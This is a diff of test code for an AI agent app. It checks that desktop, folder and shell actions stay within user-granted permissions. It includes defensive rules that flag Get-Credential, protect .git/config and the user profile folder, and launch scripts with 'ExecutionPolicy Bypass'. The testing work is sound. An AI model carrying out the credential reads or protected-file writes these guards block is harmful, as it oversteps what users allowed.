+  const off = await agentRun((b, i) => [reply('', [['desktop', { action: 'open', app: 'Calculator' }]]), reply('', [['desktop', { action: 'read', app: 'Calculator' }]]), reply('OK.')][i], { chatId: 'apps-off',
+    onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'computer_use') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(off.bodies, 1), /computer use is off in this chat and the user kept it off/);
+  assert.match(toolOut(off.bodies, 2), /computer use is off in this chat/);
+  if (WIN) assert.equal(cards, 1, 'one card per reply');
+  const apps = [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }, { name: 'Visual Studio Code', appId: 'Microsoft.VisualStudioCode', level: 'click' }, { name: 'QuorX', appId: 'QuorX', level: 'full' }];
+  const on = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'type', app: 'Calculator', ref: 1, text: '12' }]]),
+    reply('', [['desktop', { action: 'keys', app: 'Visual Studio Code', keys: '^s' }]]),
+    reply('', [['desktop', { action: 'read', app: 'QuorX' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'apps-on', settings: { appsAccess: true }, more: { apps }, onEvent: keepLevel });
+  assert.match(toolOut(on.bodies, 1), /look at only .* in Calculator, so type isn't allowed/);
+  assert.match(toolOut(on.bodies, 2), /look, click, scroll and drag, not type in Visual Studio Code, so keys isn't allowed. For a command, use shell/);
+  assert.match(toolOut(on.bodies, 3), /isn't open for this chat yet/, 'a never-used app is dropped even if the page sends it');
+  assert.match(JSON.stringify(on.bodies[0].messages.at(-1).content), /Computer use\)[\s\S]*Allowed so far: Calculator \(view\), Visual Studio Code \(click\)/);
+});
+
+test('computer use: the new actions keep to each app’s level, and steps stop at the first refusal', async () => {
+  const apps = [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }, { name: 'Paint', appId: 'Microsoft.Paint_8wekyb3d8bbwe!App', level: 'click' }];
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'scroll', app: 'Calculator', direction: 'down' }]]),
+    reply('', [['desktop', { action: 'clipboard', app: 'Paint' }]]),
+    reply('', [['desktop', { app: 'Paint', steps: [{ action: 'hold_key', key: 'shift' }, { action: 'drag', x: 1, y: 1, to_x: 5, to_y: 5 }] }]]),
+    reply('OK.'),
+  ][i], { chatId: 'apps-levels', settings: { appsAccess: true }, more: { apps }, onEvent: keepLevel });
+  assert.match(toolOut(bodies, 1), /look at only .* in Calculator, so scroll isn't allowed/);
+  assert.match(toolOut(bodies, 2), /in Paint, so clipboard isn't allowed/);
+  assert.match(toolOut(bodies, 3), /^Ran 1 of 2 steps:\n1\. hold_key: Error: .*so hold_key isn't allowed/, 'the second step never ran');
+});
+
+test('computer use: steps take the app from the step before when only the first names it', async () => {
+  const apps = [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }];
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { steps: [{ action: 'scroll', app: 'Calculator', direction: 'down' }] }]]),
+    reply('', [['desktop', { steps: [{ action: 'keys', app: 'Calculator', keys: '1' }, { action: 'type', ref: 1, text: '2' }] }]]),
+    reply('OK.'),
+  ][i], { chatId: 'apps-steps-inherit', settings: { appsAccess: true }, more: { apps }, onEvent: keepLevel });
+  assert.match(toolOut(bodies, 1), /in Calculator, so scroll isn't allowed/, 'a step\'s own app counts');
+  assert.match(toolOut(bodies, 2), /^Ran 1 of 2 steps:\n1\. keys 1: Error: .*in Calculator, so keys isn't allowed/);
+});
+
+// Last (it starts a background job): the agent's own WinForms program, driven with the new actions in one call.
+test('desktop: steps run several actions at once: double-click, wait for text, zoom and resize', { skip: !WIN }, async () => {
+  const app = `Add-Type -AssemblyName System.Windows.Forms
+$f = New-Object Windows.Forms.Form; $f.Text = 'QX Steps Form'; $f.Width = 320; $f.Height = 220
+$l = New-Object Windows.Forms.Label; $l.Text = 'Count: 0'; $l.Top = 10; $l.Left = 10
+$b = New-Object Windows.Forms.Button; $b.Text = 'Add one'; $b.Top = 40; $b.Left = 10; $b.Width = 120; $b.Height = 40
+$script:n = 0; $b.Add_Click({ $script:n++; $l.Text = "Count: $script:n" })
+$f.Controls.AddRange(@($l, $b)); [void]$f.ShowDialog()`;
+  let job = null, at = null;
+  try {
+    const { bodies } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -File app.ps1', background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'read', job }]]); }
+      if (i === 2) {
+        at = toolOut([b], 0).match(/Button "Add one" @(\d+),(\d+)/).slice(1).map(Number);
+        return reply('', [['desktop', { job, steps: [{ action: 'double_click', x: at[0], y: at[1] }, { action: 'wait_for', text: 'Count: 2', seconds: 5 }, { action: 'zoom', x: 0, y: 0, width: 150, height: 80 }, { action: 'resize', width: 420, height: 300 }] }]]);
+      }
+      if (i === 3) return reply('', [['job_stop', { job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'app.ps1'), app); allow(d, 'powershell -noprofile -executionpolicy bypass -file app.ps1*'); } });
+    const out = toolOut(bodies, 3);
+    assert.match(out, /^Ran 4 of 4 steps:/, out);
+    assert.match(out, /1\. double_click at \d+,\d+: double-clicked/);
+    assert.match(out, /2\. wait_for "Count: 2": "Count: 2" is there/, 'the double click reached the button through the same pixels the read gave');
+    assert.match(out, /3\. zoom at 0,0: Zoomed in/);
+    assert.match(out, /4\. resize: resized it to 420x300/);
+    assert.match(toolOut(bodies, 4), /0 processes left/);
+  } finally { closeForm('QX Steps Form'); }
+});
+
+// ---------- folders outside the project, added to a chat ----------
+test('folders: a write outside the project asks once to add its folder, then works there directly', async () => {
+  const other = tmp('added'), file = path.join(other, 'index.html');
+  let cards = 0;
+  const { events, bodies } = await agentRun((b, i) => [
+    reply('', [['write_file', { path: file, content: '<!doctype html><html><body>hi</body></html>' }]]),
+    reply('', [['edit_file', { path: file, find: 'hi', replace: 'hello' }]]),
+    reply('', [['read_file', { path: file }]]),
+    reply('Done.'),
+  ][i], { chatId: 'folders-ok', onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'folder') { cards++; assert.match(e.what, /^Read and write files in /); setTimeout(() => answerApproval(id, e.id, { approve: true }), 10); } } });
+  assert.equal(cards, 1, 'one card for the folder, none for the next changes');
+  assert.match(toolOut(bodies, 1), /Wrote .*index\.html .*\n\(Outside the project, in .*: Undo doesn't cover this change\.\)/);
+  assert.match(toolOut(bodies, 2), /Edited .*index\.html \(1 replacement\)/);
+  assert.match(toolOut(bodies, 3), /hello/);
+  assert.equal(fs.readFileSync(file, 'utf8'), '<!doctype html><html><body>hello</body></html>');
+  assert.deepEqual(of(events, 'folder_added').map((e) => e.folder), [{ path: other, access: 'write' }]);
+});
+
+test('folders: a folder the user doesn’t add stays out of reach; blocked places never get a card', async () => {
+  const other = tmp('declined');
+  let cards = 0;
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['write_file', { path: path.join(other, 'a.txt'), content: 'x' }]]),
+    reply('', [['write_file', { path: path.join(os.homedir(), 'qx-should-not-exist.txt'), content: 'x' }]]),
+    reply('', [['delete_file', { path: path.join(other, 'a.txt') }]]),
+    reply('OK.'),
+  ][i], { chatId: 'folders-no', onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'folder') { cards++; setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(bodies, 1), /didn't add .* to this chat/);
+  assert.equal(fs.existsSync(path.join(other, 'a.txt')), false);
+  assert.match(toolOut(bodies, 2), /^Refused: .* can't be added to this chat: your profile folder/);
+  assert.match(toolOut(bodies, 3), /^Refused: delete_file works in the project only/);
+  assert.equal(cards, 1, 'the profile folder never got a card');
+});
+
+test('folders: a read-only folder reads without a card and asks again before writing', async () => {
+  const other = tmp('readonly');
+  fs.writeFileSync(path.join(other, 'notes.txt'), 'kept');
+  let cards = [];
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['read_file', { path: path.join(other, 'notes.txt') }]]),
+    reply('', [['write_file', { path: path.join(other, 'notes.txt'), content: 'changed' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'folders-ro', more: { folders: [{ path: other, access: 'read' }] }, onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'folder') { cards.push(e.what); setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+  assert.match(toolOut(bodies, 1), /kept/);
+  assert.deepEqual(cards.map((w) => w.split(' files')[0]), ['Read and write']);
+  assert.equal(fs.readFileSync(path.join(other, 'notes.txt'), 'utf8'), 'kept');
+  assert.match(JSON.stringify(bodies[0].messages.at(-1).content), /Folders outside the project added to this chat .*\(read only\)/);
+});
+
+test('folders: commands treat a read-and-write folder like the project', { skip: !WIN }, async () => {
+  const other = tmp('cmdfolder');
+  const outside = await decide(`Set-Content "${path.join(other, 'a.txt')}" hi`, { shell: 'powershell', root: scripts, rules: [], mode: 'strict', yolo: {} });
+  assert.match(outside.why, /writes outside the project/);
+  const added = await decide(`Set-Content "${path.join(other, 'a.txt')}" hi`, { shell: 'powershell', root: scripts, rules: [], mode: 'strict', yolo: {}, added: [other] });
+  assert.equal(added.verdict, 'allow');
+  const git = await decide(`Set-Content "${path.join(other, '.git', 'config')}" x`, { shell: 'powershell', root: scripts, rules: [], mode: 'strict', yolo: {}, added: [other] });
+  assert.equal(git.verdict, 'deny', 'its .git stays protected');
+});
+
+test('folders: a chat\'s added folders are served at /wsf/<chat>/<n>/', async () => {
+  const { registerFolders, chatFolder, folderIndex } = await import('../server/workspace.js');
+  const a = tmp('wsf-a'), b = tmp('wsf-b');
+  registerFolders('chat-x', [{ path: a, access: 'read' }, { path: b, access: 'write' }]);
+  assert.equal(chatFolder('chat-x', 1), b);
+  assert.deepEqual(folderIndex('chat-x', path.join(b, 'site', 'index.html')), { i: 1, rel: 'site/index.html' });
+  assert.equal(folderIndex('chat-x', path.join(tmp('wsf-c'), 'x.html')), null);
+  assert.equal(chatFolder('other-chat', 0), null);
+});
+
+// ---------- rules: on/off, ids and use counts ----------
+test('rules: a rule turned off is kept but not used; ids stay put; adding it again turns it back on', { skip: !WIN }, async () => {
+  const root = tmp('rules-onoff');
+  fs.writeFileSync(path.join(root, 'build.js'), '');
+  saveRules('project', [{ effect: 'allow', match: 'node build.js*', by: 'user' }], root);
+  const [r] = loadRules(root).filter((x) => x.scope === 'project');
+  assert.ok(r.id && r.on === true && r.hits === 0);
+  assert.equal(loadRules(root).find((x) => x.scope === 'project').id, r.id, 'the same id on every read');
+  const run = (rules) => decide('node build.js', { shell: 'powershell', root, rules, mode: 'strict', yolo: {} });
+  assert.equal((await run(loadRules(root))).verdict, 'allow');
+  updateRule('project', r.id, { on: false }, root);
+  assert.equal(loadRules(root).find((x) => x.scope === 'project').on, false);
+  assert.notEqual((await run(loadRules(root))).verdict, 'allow', 'an off rule lets nothing through');
+  addRule('project', { effect: 'allow', match: 'node build.js*', by: 'button' }, root);
+  const back = loadRules(root).filter((x) => x.scope === 'project');
+  assert.deepEqual([back.length, back[0].on, back[0].id], [1, true, r.id]);
+  assert.ok(removeRule('project', r.id, root));
+  assert.equal(loadRules(root).filter((x) => x.scope === 'project').length, 0);
+  assert.equal(updateRule('project', 'nope', { on: true }, root), null);
+});
+
+test('rules: each command a rule lets through counts one use; a chat rule\'s use goes to the page', { skip: !WIN }, async () => {
+  const { events, dir } = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('', [['shell', { command: 'node build.js --x' }]]), reply('Done.')][i], {
+    prep: (d) => { buildJs(d); saveRules('project', [{ effect: 'allow', match: 'node build.js*', by: 'user' }], d); } });
+  const r = loadRules(dir).find((x) => x.scope === 'project');
+  assert.equal(r.hits, 2);
+  assert.ok(r.lastUsed > Date.now() - 60e3);
+  assert.equal(of(events, 'rule_used').length, 0, 'saved rules count in their file');
+  const chat = await agentRun((b, i) => [reply('', [['shell', { command: 'node build.js' }]]), reply('Done.')][i], {
+    prep: buildJs, more: { cmdRules: [{ id: 'c1', effect: 'allow', match: 'node build.js*', by: 'button' }, { id: 'c2', effect: 'allow', match: 'node other*', by: 'button', on: false }] } });
+  assert.deepEqual(of(chat.events, 'rule_used').map((e) => e.id), ['c1']);
+});
+
+// ---------- Phase 5: white captures, text from pictures, app lifetime, remembered apps ----------
+test('desktop: a flat white capture is taken again from the screen; a window\'s text is read from its picture', { skip: !WIN }, async () => {
+  const { windowShot, shotVia, windowText } = await import('../server/uia.js');
+  const { startBackground, stopBackground } = await import('../server/bgjobs.js');
+  const root = tmp('flat');
+  fs.writeFileSync(path.join(root, 'white.ps1'), "Add-Type -AssemblyName System.Windows.Forms\n$f = New-Object Windows.Forms.Form; $f.Text = 'QX White Form'; $f.BackColor = 'White'; $f.Width = 420; $f.Height = 260\n[void]$f.ShowDialog()\n");
+  fs.writeFileSync(path.join(root, 'words.ps1'), "Add-Type -AssemblyName System.Windows.Forms\n$f = New-Object Windows.Forms.Form; $f.Text = 'QX Words Form'; $f.BackColor = 'White'; $f.Width = 520; $f.Height = 260\n$l = New-Object Windows.Forms.Label; $l.Text = 'Hello Rem Studio'; $l.Font = New-Object Drawing.Font('Segoe UI', 20); $l.AutoSize = $true; $l.Top = 60; $l.Left = 40\n$f.Controls.Add($l); [void]$f.ShowDialog()\n");
+  const jobs = [];
+  try {
+    for (const f of ['white.ps1', 'words.ps1']) jobs.push(startBackground({ projectId: 'flat', cwd: root, line: `powershell -NoProfile -ExecutionPolicy Bypass -File ${f}`, shell: 'powershell', label: f }));
+    await new Promise((r) => setTimeout(r, 3500));
+    await windowShot(jobs[0].id, null);
+    assert.match(shotVia(), /flat/, `a flat picture is noticed and taken again from the screen when Windows lets it (${shotVia()})`);
+    const t = await windowText(jobs[1].id, null);
+    assert.match(t.text, /"Hello Rem Studio" @\d+,\d+/, t.text);
+  } finally { for (const j of jobs) await stopBackground(j.id).catch(() => {}); closeForm('QX White Form'); closeForm('QX Words Form'); }
+});
+
+test('desktop: a background job\'s window survives QuorX letting go of its job (a restart)', { skip: !WIN }, async () => {
+  const { runLine } = await import('../server/workspace.js');
+  const { closeJob } = await import('../server/jobhost.js');
+  const root = tmp('keepjob');
+  fs.writeFileSync(path.join(root, 'form.ps1'), FORM('QX Keep Job Form'));
+  let proc = null;
+  try {
+    runLine(root, 'powershell -NoProfile -ExecutionPolicy Bypass -File form.ps1', { shell: 'powershell', untilEmpty: true, timeout: 60e3, onStart: (p) => { proc = p; } });
+    for (let i = 0; i < 20 && !formOpen('QX Keep Job Form'); i++) await new Promise((r) => setTimeout(r, 300));
+    await new Promise((r) => setTimeout(r, 2500)); // the job notices the window and keeps it
+    await closeJob(proc.qxJob); // what QuorX quitting does to every job
+    await new Promise((r) => setTimeout(r, 800));
+    assert.ok(formOpen('QX Keep Job Form'), 'the window is still open');
+  } finally { closeForm('QX Keep Job Form'); }
+});
+
+test('desktop screenshot: named by reply too, and a model that can\'t see is pointed to read_text (the user hears once)', { skip: !WIN }, async () => {
+  let job = null;
+  try {
+    const { bodies, events, id } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -File form.ps1', background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'screenshot', job }]]); }
+      if (i === 2) return reply('', [['desktop', { action: 'screenshot', job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'form.ps1'), FORM('QX Shot Name Form')); allow(d, 'powershell -noprofile -executionpolicy bypass -file form.ps1*'); } });
+    const out = toolOut(bodies, 2);
+    assert.match(out, new RegExp(`Saved as \\.quorx/scratch/shots/${job}-${id.slice(-5)}-1\\.png`), out);
+    assert.match(out, /use read_text for the words in its picture/);
+    assert.equal(events.filter((e) => e.t === 'note' && /can't see pictures/.test(e.msg)).length, 1, 'said once per reply');
+  } finally { closeForm('QX Shot Name Form'); }
+});
+
+test('desktop: type replaces and reads back, a right-button drag reaches the app, and a "replace it?" Yes asks first', { skip: !WIN }, async () => {
+  const app = `Add-Type -AssemblyName System.Windows.Forms
+$f = New-Object Windows.Forms.Form; $f.Text = 'QX Dialog Form'; $f.Width = 520; $f.Height = 360
+$t = New-Object Windows.Forms.TextBox; $t.Text = 'model'; $t.Top = 10; $t.Left = 10; $t.Width = 200
+$q = New-Object Windows.Forms.Label; $q.Text = 'model.vroid already exists. Do you want to replace it?'; $q.Top = 40; $q.Left = 10; $q.Width = 480
+$y = New-Object Windows.Forms.Button; $y.Text = 'Yes'; $y.Top = 70; $y.Left = 10
+$p = New-Object Windows.Forms.Panel; $p.Top = 110; $p.Left = 10; $p.Width = 300; $p.Height = 150; $p.BackColor = 'LightGray'
+$b = New-Object Windows.Forms.Label; $b.Text = 'Pressed: none'; $b.Top = 270; $b.Left = 10; $b.Width = 300
+$p.Add_MouseDown({ param($s, $e) $b.Text = "Pressed: $($e.Button)" })
+$f.Controls.AddRange(@($t, $q, $y, $p, $b)); [void]$f.ShowDialog()`;
+  let job = null, cards = [];
+  try {
+    const { bodies } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -File app.ps1', background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'read', job }]]); }
+      const out = toolOut([b], 0);
+      if (i === 2) return reply('', [['desktop', { action: 'type', job, ref: Number(out.match(/\[(\d+)\] Edit/)[1]), text: 'rem-rezero' }]]);
+      if (i === 3) return reply('', [['desktop', { action: 'click', job, ref: Number(out.match(/\[(\d+)\] Button "Yes"/)[1]) }]]);
+      if (i === 4) return reply('', [['desktop', { action: 'drag', job, x: 60, y: 160, to_x: 200, to_y: 200, button: 'right' }]]);
+      if (i === 5) return reply('', [['job_stop', { job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'app.ps1'), app); allow(d, 'powershell -noprofile -executionpolicy bypass -file app.ps1*'); },
+      onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'desktop') { cards.push(e); setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } } });
+    assert.match(toolOut(bodies, 3), /^typed it \(it held "model" before\); it now holds "rem-rezero"/, toolOut(bodies, 3));
+    assert.match(toolOut(bodies, 4), /^The user didn't let you click “Yes”.*Answer the dialog the safe way/, toolOut(bodies, 4));
+    assert.match(cards[0]?.why || '', /already exists\. Do you want to replace it\?/);
+    assert.match(toolOut(bodies, 5), /^right-dragged from 60,160 to 200,200[\s\S]*Pressed: Right/, toolOut(bodies, 5));
+  } finally { closeForm('QX Dialog Form'); }
+});
+
+test('desktop type: a Save dialog\'s file name is replaced, not added to', { skip: !WIN }, async () => {
+  const app = `Add-Type -AssemblyName System.Windows.Forms
+$d = New-Object Windows.Forms.SaveFileDialog; $d.Title = 'QX Save Test'; $d.FileName = 'bat.png'; $d.InitialDirectory = $env:TEMP
+[void]$d.ShowDialog()`;
+  let job = null;
+  try {
+    const { bodies } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -File save.ps1', background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'wait_for', job, text: 'File name', seconds: 15 }]]); }
+      if (i === 2) return reply('', [['desktop', { action: 'read', job }]]);
+      if (i === 3) { const ref = Number(toolOut([b], 0).match(/\[(\d+)\] (?:Edit|ComboBox) "File name:"/)?.[1]); return reply('', [['desktop', { action: 'type', job, ref, text: 'C:\\Temp\\quorx-bat.png' }]]); }
+      if (i === 4) return reply('', [['job_stop', { job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'save.ps1'), app); allow(d, 'powershell -noprofile -executionpolicy bypass -file save.ps1*'); } });
+    assert.match(toolOut(bodies, 3), /(\[\d+\] (Edit|ComboBox) "File name:")/, 'the File name box is in the read, not cut off by the folder tree');
+    assert.match(toolOut(bodies, 4), /^typed it \(it held "bat(\.png)?" before\); it now holds "C:\\Temp\\quorx-bat\.png"/, toolOut(bodies, 4));
+    assert.ok(toolOut(bodies, 3).length < 9000, `the folder tree and file rows are collapsed (${toolOut(bodies, 3).length} chars)`);
+  } finally { closeForm('QX Save Test'); }
+});
+
+test('desktop: after a click the window is read until it settles, so a change a moment later is seen', { skip: !WIN }, async () => {
+  const app = `Add-Type -AssemblyName System.Windows.Forms
+$f = New-Object Windows.Forms.Form; $f.Text = 'QX Settle Form'; $f.Width = 320; $f.Height = 200
+$l = New-Object Windows.Forms.Label; $l.Text = 'Idle'; $l.Top = 10; $l.Left = 10; $l.Width = 200
+$b = New-Object Windows.Forms.Button; $b.Text = 'Load'; $b.Top = 40; $b.Left = 10
+$t = New-Object Windows.Forms.Timer; $t.Interval = 1200; $t.Add_Tick({ $l.Text = 'Loaded 42 items'; $t.Stop() })
+$b.Add_Click({ $l.Text = 'Loading'; $t.Start() })
+$f.Controls.AddRange(@($l, $b)); [void]$f.ShowDialog()`;
+  let job = null;
+  try {
+    const { bodies } = await agentRun((b, i) => {
+      if (i === 0) return reply('', [['shell', { command: 'powershell -NoProfile -ExecutionPolicy Bypass -File app.ps1', background: true }]]);
+      if (i === 1) { job = toolOut([b], 0).match(/job (bg\d+)/)[1]; return reply('', [['desktop', { action: 'read', job }]]); }
+      if (i === 2) return reply('', [['desktop', { action: 'click', job, ref: Number(toolOut([b], 0).match(/\[(\d+)\] Button "Load"/)[1]) }]]);
+      if (i === 3) return reply('', [['job_stop', { job }]]);
+      return reply('Done.');
+    }, { prep: (d) => { fs.writeFileSync(path.join(d, 'app.ps1'), app); allow(d, 'powershell -noprofile -executionpolicy bypass -file app.ps1*'); } });
+    assert.match(toolOut(bodies, 3), /Loaded 42 items/, toolOut(bodies, 3).slice(0, 600));
+  } finally { closeForm('QX Settle Form'); }
+});
+
+test('app notes: learned points are kept per app across chats, without repeats, and only for apps the chat opened', async () => {
+  const { readNotes, addNotes } = await import('../server/appnotes.js');
+  addNotes('app', 'Paint 11.2', '- New shapes stay selected: click outside before drawing the next\nCtrl+A selects the whole canvas');
+  addNotes('app', 'paint', 'Ctrl+A selects the whole canvas\n- Text tool: click the canvas, then type');
+  const n = readNotes('app', 'Paint');
+  assert.equal(n.split('\n').length, 3, n);
+  assert.match(n, /^- New shapes stay selected/);
+  const apps = [{ name: 'Visual Studio Code', appId: 'Microsoft.VisualStudioCode', level: 'view' }];
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['desktop', { action: 'learn', app: 'Visual Studio Code', text: 'Cline opens from View > Open View > Cline' }]]),
+    reply('', [['desktop', { action: 'learn', app: 'Notepad', text: 'x' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'appnotes1', settings: { appsAccess: true }, more: { apps } });
+  assert.match(toolOut(bodies, 1), /^Saved for Visual Studio Code/);
+  assert.match(readNotes('app', 'Visual Studio Code'), /Open View > Cline/);
+  assert.match(toolOut(bodies, 2), /^Error: give app: the name of an app this chat opened \("Notepad" isn't one\)/);
+});
+
+test('desktop open: app names match loosely (spaces, case, version numbers)', { skip: !WIN || !!process.env.CI }, async () => {
+  const { findApps } = await import('../server/uia.js');
+  for (const n of ['Calculator', 'calculator', 'Calcu lator', 'CALCULATOR 11.2']) assert.equal((await findApps(n))[0]?.name, 'Calculator', n);
+});
+
+test('computer use: the chat\'s saved apps count even when the page sends none', async () => {
+  const { saveChat } = await import('../server/store.js');
+  const chatId = 'cmsavedapps1';
+  saveChat(chatId, { id: chatId, title: 't', projectId: 'scratch', agent: { messages: [], artifacts: {}, apps: [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }] } });
+  const { bodies } = await agentRun((b, i) => [reply('', [['desktop', { action: 'type', app: 'Calculator', ref: 1, text: '1' }]]), reply('OK.')][i], { chatId, settings: { appsAccess: true }, more: { apps: [] }, onEvent: keepLevel });
+  assert.match(toolOut(bodies, 1), /look at only .* in Calculator/, 'known from the chat file, held to its level');
+});
+
+test('computer use off: one card turns it on for the chat, and the desktop call goes ahead', { skip: !WIN }, async () => {
+  const { events, bodies } = await agentRun((b, i) => [reply('', [['desktop', { action: 'type', app: 'Calculator', ref: 1, text: '1' }]]), reply('OK.')][i], { chatId: 'apps-ask-on',
+    more: { apps: [{ name: 'Calculator', appId: 'Microsoft.WindowsCalculator_8wekyb3d8bbwe!App', level: 'view' }] },
+    onEvent: (e, id) => { if (e.t === 'approval' && e.tool === 'computer_use') setTimeout(() => answerApproval(id, e.id, { approve: true }), 10); keepLevel(e, id); } });
+  assert.ok(events.some((e) => e.t === 'tools_on' && e.kinds.includes('apps')), 'the page hears it is on');
+  assert.match(toolOut(bodies, 1), /look at only .* in Calculator/, 'past the switch, held to the app\'s level');
+});
+
+test('shell: a declined program start points to desktop open; a declined OCR script to read_text', { skip: !WIN }, async () => {
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['shell', { command: 'Start-Process -FilePath "C:\\Windows\\System32\\notepad.exe"' }]]),
+    reply('', [['shell', { command: 'powershell -File .quorx/scratch/ocr.ps1 shot.png' }]]),
+    reply('OK.'),
+  ][i], { chatId: 'shell-desk-way', onEvent: (e, id) => { if (e.t === 'approval' && e.mode === 'strict') setTimeout(() => answerApproval(id, e.id, { approve: false }), 10); } });
+  assert.match(toolOut(bodies, 1), /use desktop open with app: "C:\\Windows\\System32\\notepad\.exe"/, toolOut(bodies, 1));
+  assert.match(toolOut(bodies, 2), /read_text reads the words/, toolOut(bodies, 2));
+});
+
+test('plan first: a shell line that only reads runs before the plan; a change waits', { skip: !WIN }, async () => {
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['shell', { command: 'Get-ChildItem' }]]),
+    reply('', [['shell', { command: 'Set-Content a.txt hi' }]]),
+    reply('OK.'),
+  ][i], { settings: { planFirst: 'always' } });
+  assert.match(toolOut(bodies, 1), /Exit code 0/);
+  assert.match(toolOut(bodies, 2), /^Refused: plan first.*Commands that only read/);
+});
+
+test('commands: unknown cmdlets with a reading verb are reads (Get-NetTCPConnection, Measure-Object); Get-Credential isn\'t', async () => {
+  for (const line of ['Get-NetTCPConnection -LocalPort 5188', 'Get-Process | Measure-Object', 'Get-AppxPackage *calc*']) {
+    const d = await decide(line, ctx({ shell: 'powershell' }));
+    assert.equal(d.verdict, 'allow', line);
+    assert.ok(d.segments.every((s) => s.cls === 'read'), line);
+  }
+  assert.notEqual((await decide('Get-Credential', ctx({ shell: 'powershell' }))).segments[0].cls, 'read');
+});
+
+test('decide: a question about the screen with no picture is refused, or takes the last desktop picture', async () => {
+  const { bodies } = await agentRun((b, i) => [
+    reply('', [['decide', { state: 'The window shows a red tile', questions: [{ type: 'noul', ask: 'The tile in the screenshot is red', my_guess: 'yes', my_confidence: 0.9 }] }]]),
+    reply('OK.'),
+  ][i]);
+  assert.match(toolOut(bodies, 1), /^Error: these questions are about what is on screen, but no picture was given/);
 });
